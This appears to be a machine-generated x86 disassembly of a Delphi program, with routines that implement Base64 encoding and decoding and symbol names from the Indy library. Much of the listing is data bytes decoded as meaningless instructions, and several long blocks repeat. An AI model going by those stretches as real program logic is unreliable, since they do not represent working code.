add eax 0x2
jno r-xdata
call sub_403e34
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov [ ebp - 0xe ] al
mov eax ebx
sub eax 0x1
jno r-xdata
add eax 0x3
jno r-xdata
call sub_403e34
mov edx [ ebp - 0x8 ]
test edx edx
je r-xdata
call sub_403e34
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov [ ebp - 0xd ] al
add ebx 0x4
jno r-xdata
movzx eax [ ebp - 0x10 ]
dec eax
cmp eax 0x7e
jbe r-xdata
call sub_403e34
inc eax
movzx eax [ edi + eax + 0x37 ]
shl eax 0x12
movzx edx [ ebp - 0xf ]
dec edx
cmp edx 0x7e
jbe r-xdata
call sub_403e2c
inc edx
movzx edx [ edi + edx + 0x37 ]
shl edx 0xc
or eax edx
movzx edx [ ebp - 0xe ]
dec edx
cmp edx 0x7e
jbe r-xdata
call sub_403e2c
inc edx
movzx edx [ edi + edx + 0x37 ]
shl edx 0x6
or eax edx
movzx edx [ ebp - 0xd ]
dec edx
cmp edx 0x7e
jbe r-xdata
call sub_403e2c
inc edx
movzx edx [ edi + edx + 0x37 ]
or eax edx
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
call sub_46495c
mov eax 0x2
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
test edx edx
je r-xdata
call sub_403e2c
cmp esi [ edx - 0x4 ]
jb r-xdata
mov [ edx + esi ] al
mov eax 0x1
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov edx esi
add edx 0x1
jno r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
call sub_403e34
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
mov [ ecx + edx ] al
xor eax eax
mov edx [ ebp - 0x4 ]
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
movzx eax [ edx + eax ]
mov edx esi
add edx 0x2
jno r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
call sub_403e34
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
mov [ ecx + edx ] al
add esi 0x3
jno r-xdata
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
call sub_403e34
cmp esi [ ebp + 0xc ]
jle r-xdata
movzx eax [ ebp - 0x1d ]
cmp al [ ebp - 0xe ]
jne r-xdata
cmp ebx [ ebp - 0x18 ]
jle r-xdata
sub esi [ ebp + 0xc ]
jno r-xdata
movzx eax [ ebp - 0x1d ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov [ ebp - 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_403e34
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub_481820
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4818ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_4192c0
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
cdq
push edx
push eax
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov ebx eax
test ebx ebx
jle r-xdata
call sub_403e2c
mov eax [ ebp + 0x8 ]
call sub_404e44
push ebx
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push ebx
push 0x0
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_463544
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4818fc
mov eax [ ebp - 0x8 ]
mov ecx 0x7fffffff
xor edx edx
call sub_4649fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4818f1
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_405af0
retn
sub_4818fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_406474
xor eax eax
push ebp
push sub_481ce2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_406248
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x2
jno r-xdata
mov ecx 0x3
cdq
idiv ecx
imul edi eax 0x4
jno r-xdata
call sub_403e34
push edi
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
xor eax eax
xor edx edx
cmp edx [ ebp - 0x8 ]
jg r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_481ce9
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov ecx [ ebp - 0x8 ]
sub ecx edx
jno r-xdata
mov [ ebp - 0xc ] ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
call sub_403e34
cmp [ ebp - 0xc ] 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
movzx ecx [ ecx + edx ]
mov [ ebp - 0xd ] cl
mov ecx edx
add ecx 0x1
jno r-xdata
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
movzx ecx [ ecx + edx ]
mov [ ebp - 0xd ] cl
mov ecx edx
add ecx 0x1
jno r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
call sub_403e34
movzx edx [ ecx + edx ]
mov [ ebp - 0xd ] dl
mov [ ebp - 0xe ] 0x0
mov [ ebp - 0xf ] 0x0
mov [ ebp - 0x14 ] 0x1
mov edx [ ebp - 0x8 ]
add edx 0x1
jno r-xdata
movzx ecx [ ecx + edx ]
mov [ ebp - 0xd ] cl
add edx 0x1
jno r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
movzx ecx [ ebp - 0xd ]
shr ecx 0x2
and ecx 0x3f
add ecx 0x1
jno r-xdata
call sub_403e34
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
movzx ecx [ edi + ecx ]
mov [ ebp - 0xe ] cl
mov ecx edx
add ecx 0x2
jno r-xdata
mov edi [ ebx + 0x30 ]
dec ecx
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
movzx ecx [ edi + ecx ]
mov [ ebp - 0xe ] cl
add edx 0x2
jno r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
movzx edx [ ecx + edx ]
mov [ ebp - 0xe ] dl
mov [ ebp - 0xf ] 0x0
mov [ ebp - 0x14 ] 0x2
mov edx [ ebp - 0x8 ]
add edx 0x1
jno r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
inc ecx
movzx ecx [ edi + ecx - 0x1 ]
mov [ ebp - 0x18 ] cl
movzx ecx [ ebp - 0xd ]
shl ecx 0x4
movzx edi [ ebp - 0xe ]
shr edi 0x4
or ecx edi
and ecx 0x3f
add ecx 0x1
jno r-xdata
jmp r-xdata
call sub_403e34
call sub_403e2c
cmp edx [ ecx - 0x4 ]
jb r-xdata
movzx ecx [ edi + ecx ]
mov [ ebp - 0xf ] cl
mov [ ebp - 0x14 ] 0x3
add edx 0x3
jno r-xdata
mov edi [ ebx + 0x30 ]
dec ecx
test edi edi
je r-xdata
call sub_403e34
movzx edx [ ecx + edx ]
mov [ ebp - 0xf ] dl
mov [ ebp - 0x14 ] 0x3
mov edx [ ebp - 0x8 ]
add edx 0x1
jno r-xdata
jmp r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
jmp r-xdata
call sub_403e34
inc ecx
movzx ecx [ edi + ecx - 0x1 ]
mov [ ebp - 0x17 ] cl
movzx ecx [ ebp - 0xe ]
add ecx ecx
add ecx ecx
movzx edi [ ebp - 0xf ]
shr edi 0x6
or ecx edi
and ecx 0x3f
add ecx 0x1
jno r-xdata
mov edi [ ebx + 0x30 ]
dec ecx
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
inc ecx
movzx ecx [ edi + ecx - 0x1 ]
mov [ ebp - 0x16 ] cl
movzx ecx [ ebp - 0xf ]
and cl 0x3f
movzx ecx cl
add ecx 0x1
jno r-xdata
mov edi [ ebx + 0x30 ]
dec ecx
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
inc ecx
movzx ecx [ edi + ecx - 0x1 ]
mov [ ebp - 0x15 ] cl
mov ecx [ esi ]
test ecx ecx
je r-xdata
call sub_403e2c
cmp eax [ ecx - 0x4 ]
jb r-xdata
lea edi [ ecx + eax ]
movzx ecx [ ebp - 0x18 ]
mov [ edi ] cl
mov ecx eax
add ecx 0x1
jno r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
add edi ecx
movzx ecx [ ebp - 0x17 ]
mov [ edi ] cl
mov ecx eax
add ecx 0x2
jno r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
add edi ecx
movzx ecx [ ebp - 0x16 ]
mov [ edi ] cl
mov ecx eax
add ecx 0x3
jno r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
add edi ecx
movzx ecx [ ebp - 0x15 ]
mov [ edi ] cl
add eax 0x4
jno r-xdata
cmp [ ebp - 0x14 ] 0x3
jge r-xdata
call sub_403e34
cmp edx [ ebp - 0x8 ]
jle r-xdata
mov ecx eax
sub ecx 0x1
jno r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x34 ]
pop edi
mov [ edi ] cl
cmp [ ebp - 0x14 ] 0x1
jne r-xdata
mov ecx eax
sub ecx 0x2
jno r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
call sub_403e34
call sub_403e2c
cmp ecx [ edi - 0x4 ]
jb r-xdata
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x34 ]
pop edi
mov [ edi ] cl
sub_481cf4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffbe26 ] ch
outsb
inc ecx
add ah ch
fld [ ecx ]
enter 0x416d 0x0
dec eax
add [ eax ] bh
add [ eax ] al
add [ ecx + edx + 0x48 ] dh
add al ch
loope r-xdata
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
jb r-xdata
add [ eax + 0x50 ] dh
inc esi
add ah bh
sbb eax 0x18200048
dec eax
add [ esi ] cl
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4650ac
lea eax [ ebx + 0x30 ]
mov edx [ rw-data ]
call sub_404e98
mov [ ebx + 0x34 ] 0x3d
pop ebx
retn
dec ecx
dec ebp
inc ebp
add [ eax ] al
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
dec ecx
dec ebp
inc ebp
nop
mov [ 0xe070048 ] bl
push esp
dec ecx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
pop ebp
retn
jb r-xdata
jno r-xdata
dec ecx
dec ebp
inc ebp
cmp al 0x1d
dec eax
add [ edx + edx ] bl
dec eax
add [ eax + eax ] al
or ecx [ ecx + 0x64 ]
inc ebx
outsd
jb r-xdata
movsb [ edi ] [ esi ]
push ds
je r-xdata
mov eax eax
jae r-xdata
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffb7de ] dh
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x1ee8c08b
dec eax
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
push ds
dec eax
add [ eax ] dl
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffb7de ] dh
outsb
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ eax - 0x7fffbfce ] dl
and al 0x48
add [ eax ] bh
and al 0x48
add [ esp + 0x48 ] bl
add [ edx + 0x48 ] ah
add ah bl
and ecx [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
jne r-xdata
add [ eax ] al
jbe r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push ds
dec eax
add [ eax ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
arpl [ ecx + 0x75 ] ax
je r-xdata
outsb
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ eax + 0x40004825 ] ch
daa
dec eax
add [ eax ] bh
and al 0x48
add [ esp + 0x48 ] bl
lodsb [ esi ]
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
ja r-xdata
inc eax
popad
jns r-xdata
add [ eax + 0x20 ] cl
dec eax
add [ eax + eax ] cl
outsb
je r-xdata
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
inc ecx
add [ eax ] al
add [ eax ] dl
dec ecx
inc ecx
jne r-xdata
add [ eax ] al
jpe r-xdata
add [ eax ] al
jns r-xdata
add al 0x8b
enter 0x558b 0xfc
push 0x7473694c
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + edx * 2 - 0x75 ] si
in al dx
add esp 0xfffffeec
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x114 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_4821e4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] cl
push esp
inc ecx
jne r-xdata
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
imul esi [ gs : bp + di + 0x74 ] 0x64657265
inc ecx
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
or al 0x0
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0xc000408d
pop ds
dec eax
add [ edi ] al
push ss
push esp
dec ecx
inc edx
popad
jae r-xdata
add [ esp + 0x272c0048 ] al
dec eax
add al al
and al 0x48
add [ eax ] ch
daa
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x10004010 ] dh
add [ eax ] al
add [ esi ] dl
push esp
dec ecx
inc edx
popad
jae r-xdata
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x1f640000
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffb7e1 ] dl
pop ds
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1400481f ] ah
add [ eax ] al
add [ eax + 0x1e ] bl
dec eax
mov ebp esp
xor eax eax
push ebp
push sub_481e4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
add [ eax ] al
call sub_48668b
sub ebp [ edi ]
xor [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4821eb
lea eax [ ebp - 0x114 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x6874654d
outsd
lea eax [ eax ]
shl [ eax ] 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
and [ eax ] cl
or [ eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
arpl [ ecx + 0x75 ] ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax rw-data
call sub_404e44
push 0x0
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
lea edx [ ebp - 0x110 ]
call sub_403e44
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x114 ]
mov eax [ r-xdata ]
pop ecx
call sub_4624e8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ eax + 0x4 ] ebx
mov ecx eax
mov edx [ ebp - 0x4 ]
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sub [ ebp + 0x49 ] al
inc ecx
insb
jb r-xdata
inc eax
add ah bh
inc eax
outsb
je r-xdata
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
in al 0x1e
dec eax
add [ eax ] al
add [ eax ] dl
dec ecx
inc ecx
jne r-xdata
jne r-xdata
inc ecx
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x408d0000
add [ eax + 0x48 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_481db3
inc [ eax ]
add [ eax ] al
inc ecx
inc edx
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
popad
bound esp [ ebx + 0x64 ]
push 0x6a69
imul ebp [ ebp + ebp * 2 + 0x6e ] 0x6f
jo r-xdata
pop ebp
retn
jb r-xdata
movsb [ edi ] [ esi ]
push ds
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push ds
dec eax
add [ eax ] al
je r-xdata
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffb7de ] dh
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x1ee8c08b
dec eax
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
push ds
dec eax
add [ eax ] dl
add [ eax ] al
add [ eax ] al
inc edx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffb7de ] dh
outsb
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ eax - 0x7fffbfce ] dl
and al 0x48
add [ eax ] bh
and al 0x48
add [ esp + 0x48 ] bl
add [ edx + 0x48 ] ah
add ah bl
and ecx [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
arpl [ ecx + 0x75 ] ax
je r-xdata
outsb
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ eax + 0x40004825 ] ch
daa
dec eax
add [ eax ] bh
and al 0x48
add [ esp + 0x48 ] bl
lodsb [ esi ]
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
popad
jns r-xdata
add [ eax + 0x20 ] cl
dec eax
add [ eax + eax ] cl
outsb
je r-xdata
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
inc ecx
add [ eax ] al
add [ eax ] dl
dec ecx
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
call sub_48668b
jpe r-xdata
add al 0x8b
enter 0x558b 0xfc
push 0x7473694c
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + edx * 2 - 0x75 ] si
in al dx
add esp 0xfffffeec
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x114 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_4821e4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] cl
push esp
inc ecx
jne r-xdata
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
imul esi [ gs : bp + di + 0x74 ] 0x64657265
inc ecx
add [ eax ] al
insb
sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
or al 0x0
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0xc000408d
pop ds
dec eax
add [ edi ] al
push ss
push esp
dec ecx
inc edx
popad
jae r-xdata
add [ esp + 0x272c0048 ] al
dec eax
add al al
and al 0x48
add [ eax ] ch
daa
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x10004010 ] dh
add [ eax ] al
add [ esi ] dl
push esp
dec ecx
inc edx
popad
jae r-xdata
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x1f640000
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffb7e1 ] dl
pop ds
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x1400481f ] ah
add [ eax ] al
add [ eax + 0x1e ] bl
dec eax
mov ebp esp
xor eax eax
push ebp
push sub_481e4d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor [ edx ] esi
xor esi [ esi + 0x39383736 ]
sub ebp [ edi ]
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4650ac
lea eax [ ebx + 0x30 ]
mov edx [ rw-data ]
call sub_404e98
mov [ ebx + 0x34 ] 0x3d
pop ebx
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4821eb
lea eax [ ebp - 0x114 ]
call sub_404e44
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404e68
retn
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
push 0x69746e65
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] 0x6874654d
outsd
lea eax [ eax ]
shl [ eax ] 0x48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
and [ eax ] cl
or [ eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
arpl [ ecx + 0x75 ] ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax rw-data
call sub_404e44
push 0x0
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
lea edx [ ebp - 0x110 ]
call sub_403e44
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_406fd4
mov edx [ ebp - 0x114 ]
mov eax [ r-xdata ]
pop ecx
call sub_4624e8
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ eax + 0x4 ] ebx
mov ecx eax
mov edx [ ebp - 0x4 ]
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sub [ ebp + 0x49 ] al
inc ecx
insb
jb r-xdata
inc eax
add ah bh
inc eax
outsb
je r-xdata
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
in al 0x1e
dec eax
add [ eax ] al
add [ eax ] dl
